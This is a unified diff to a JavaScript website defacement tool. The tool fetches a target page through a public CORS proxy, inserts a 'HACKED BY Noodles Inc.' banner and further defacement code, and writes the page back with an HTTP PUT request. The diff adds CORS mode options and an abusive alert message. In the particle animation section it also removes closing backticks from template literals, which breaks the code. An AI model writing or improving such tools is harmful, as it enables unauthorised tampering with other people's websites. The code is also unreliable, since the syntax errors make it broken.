@@ -34,21 +34,25 @@
  };
  
 
- // Function to fetch content with CORS bypass
+ // Function to fetch content with CORS bypass and error handling
  async function fetchWithCORS(url) {
   const corsProxy = 'https://corsproxy.io/?'; // Using corsproxy.io
   const proxiedUrl = corsProxy + encodeURIComponent(url);
  
 
   try {
-  const response = await fetch(proxiedUrl);
+  const response = await fetch(proxiedUrl, {
+  mode: 'cors', // Explicitly set CORS mode
+  });
   if (!response.ok) {
   throw new Error(`HTTP error! Status: ${response.status}`);
   }
   return await response.text();
   } catch (error) {
   console.error("Error fetching with CORS bypass:", error);
-  throw error;
+  alert("Failed to fetch URL. Check console for details, asshole.");
+  logAction(`Fetch error: ${error}`);
+  throw error; // Re-throw to handle it in the main function
   }
  }
  
@@ -94,7 +98,8 @@
 
   const originalContent = await fetchWithCORS(targetURL);
   const modifiedContent = originalContent.replace('</body>', `<div style="color: purple; background-color: darkred; font-size: 2em; text-align: center;">HACKED BY Noodles Inc. - YOU JUST GOT FUCKED!</div>${defacementCode}</body>`);
-  
+ 
+
   // Use a proxy to bypass CORS for PUT requests
   const corsProxy = 'https://corsproxy.io/?';
   const proxiedUrl = corsProxy + encodeURIComponent(targetURL);
@@ -102,6 +107,7 @@
 
   const response = await fetch(proxiedUrl, {
   method: 'PUT',
+  mode: 'cors',  // Explicitly set CORS mode
   headers: {
   'Content-Type': 'text/html',
   },
@@ -134,9 +140,10 @@
 
   try {
   logAction("Attempting to restore website...");
-  const backupResponse = await fetch(backupURL);
+  const backupResponse = await fetch(backupURL, { mode: 'cors' });
   const backupContent = await backupResponse.text();
-  
+ 
+
   // Use a proxy to bypass CORS for PUT requests
   const corsProxy = 'https://corsproxy.io/?';
   const proxiedUrl = corsProxy + encodeURIComponent(targetURL);
@@ -144,6 +151,7 @@
 
   const response = await fetch(proxiedUrl, {
   method: 'PUT',
+  mode: 'cors',  // Explicitly set CORS mode
   headers: {
   'Content-Type': 'text/html',
   },
@@ -294,8 +302,8 @@
  
 
   particle.addEventListener('animationiteration', () => {
-  particle.style.top = `${Math.random() * 100}%`;
-  particle.style.left = `${Math.random() * 100}%`;
+  particle.style.top = `${Math.random() * 100}%;
+  particle.style.left = `${Math.random() * 100}%;
   particle.style.opacity = `${Math.random()}`;
   });
  }
